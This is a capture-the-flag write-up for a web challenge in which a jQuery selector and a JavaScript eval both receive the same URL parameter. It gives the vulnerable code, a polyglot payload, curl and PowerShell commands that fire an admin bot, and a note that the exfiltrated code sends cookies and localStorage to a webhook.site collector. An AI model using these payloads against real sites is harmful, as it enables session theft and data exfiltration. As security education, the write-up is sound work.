# Polynomial Evaluator — Web / Client-Side XSS via jQuery-selector ∩ JS eval

- **Category:** Web (client-side XSS → admin cookie exfil)
- **Points:** 219 | **Solves:** 33 | **Difficulty:** medium
- **Flag format:** `K17{...}`
- **Target:** `https://polynomial.secso.cc` (React SPA + Express + `/report` admin bot)
- **Description:** "Any issues with format? Admin is always on duty!"
- **FLAG (verified via live admin exfil):** `K17{P4553D_JQU3RY_4ND_J5_4T_TH3_54M3_TIM3!}`

## Recon
- SPA served at `/`; bundle `assets/index-0OGNtCbS.js`. `/report` (POST `url=`) queues an **admin bot** visit; it only accepts **same-origin challenge paths** ("Admin is always on duty" = the bot).
- App reads URL params `x`, `y`, `formula`, `format`, `autoEval`. Form `id = "poly_" + format`. `autoEval=1` auto-submits after 600ms.
- No CSP on the app page → inline `eval`/`Function` allowed.

## The vulnerable sink (in the submit handler)
```js
const selected = formElement.id.replace("poly_","");   // = URL ?format=
let template;
try { template = $("#template_" + selected); }          // jQuery selector on user input
catch (e) { writeAnswer("Formatter selector error."); return; }
if (template.length === 0) {
  try {
    let type_;
    const answer = eval(`type_${selected}(this, selected)`);  // ★ eval on user input
    writeAnswer(answer);
  } catch (error) { writeAnswer("Formatter error."); }
  return;
}
type_standard(this, selected);
```
To reach `eval`, `selected` must make `$("#template_"+selected)`:
1. **not throw** (else caught, no eval), and
2. **return length 0** (else it calls `type_standard`).
…AND simultaneously be **valid JS** in `` `type_${selected}(this, selected)` ``.

## Key insight — "Any issues with FORMAT?" = a string that is BOTH a valid jQuery selector AND injecting JS
Proven empirically with a jsdom + jQuery **3.7.1** harness:
- Selector-safe chars (no throw, len 0): letters, digits, `. + ~ > * : - _ | \ space`. Blocked: `( ) { } ' " \` = ! $ % /`.
- **Unknown pseudo-classes don't throw**: `#template_x:eval(...)`, `:fetch(...)`, `:not(...)` all return len 0 without error. Nested pseudo-parens like `:eval(atob(...))` stay valid selectors.
- In JS, `` `type_${selected}(...)` `` with `selected = "x:NAME(ARG)"` parses as **label** `type_x:` + a **real call** `NAME(ARG)(this, selected)`. So `NAME` can be any real global function (`eval`, `fetch`, …) and `ARG` any selector-safe JS (dotted identifiers, nested pseudo-parens).

So `format = x:eval(atob(<b64>))` runs arbitrary JS. Deliver the base64 via the **`formula`** param and read it as `document.forms.item(0).dataset.formula` — this **survives** `updateCurrentUrl()` which does `replaceState(pathname+search)` and **wipes the URL hash** (hash-delivery fails; query/`data-formula` delivery works).

## Final payload
- `format = x:eval(atob(document.forms.item(0).dataset.formula))`
- `formula = base64( exfil JS )`, `autoEval=1`
- Exfil JS (guarded, fetch-first): sends `document.cookie`, `localStorage`, `location.href`, body HTML to a webhook collector.

Reported relative path (POST to `/report`, `url=`):
```
/?x=1&y=2&formula=<BASE64>&format=x:eval(atob(document.forms.item(0).dataset.formula))&autoEval=1
```

## Exploit steps (exact)
```powershell
# 1. build payload (Node): base64 the exfil JS, url-encode params -> report_body.txt
node build_payload.js
# 2. create a webhook.site collector
curl.exe -sS -X POST https://webhook.site/token -H "Content-Type: application/json" --data "{}"
# 3. fire the admin bot
curl.exe -sS -X POST https://polynomial.secso.cc/report `
  -H "Content-Type: application/x-www-form-urlencoded" --data "@report_body.txt"   # -> 202 "Admin bot visit queued."
# 4. read the collector
Invoke-WebRequest https://webhook.site/token/<uuid>/requests?sorting=newest -OutFile wh_hits.json
```

## Verification
The admin (HeadlessChrome, on `http://127.0.0.1:9999`) hit the collector:
```
query.c = token=K17{P4553D_JQU3RY_4ND_J5_4T_TH3_54M3_TIM3!}
```
The flag text ("passed jQuery and JS at the same time") confirms the intended technique — not a decoy. Verified end-to-end before submission via a jsdom+jQuery harness reproducing the exact submit flow (`updateCurrentUrl` → selector check → eval branch), which recorded the `fetch(...cookie...)` firing.

## Generalization
- **CLASS:** client-side XSS where user input flows into BOTH a `$()`/jQuery selector AND an `eval`/`Function`, gated by "selector must not match / not throw." The exploit is an input that is **simultaneously a valid non-matching CSS/jQuery selector and valid JS**.
- **TELL:** challenge word "**format**" + a `/report` "admin visits your URL" bot + a bundle containing `eval(\`type_${x}(...)\`)` next to `$("#..."+x)`. Read the minified bundle: grep for `eval(`, `Function(`, `$("#"+`, and a `/report` form.
- **Reusable jQuery/Sizzle facts (3.7.x):** unknown `:pseudo()` don't throw (len 0); nested `:a(b(c))` parens valid; JS `label:` before a call lets you smuggle a real function call through a "selector-shaped" string; `replaceState` in the app can wipe the `#hash`, so deliver code via a query param / DOM attribute (`data-*`) instead.
- **Method that saved time:** build a **jsdom + real jQuery** harness and empirically probe (a) which chars/pseudos throw, (b) the exact JS parse, (c) the full submit flow — instead of reasoning about Sizzle internals. Validate the full exploit locally, then fire ONE admin visit.
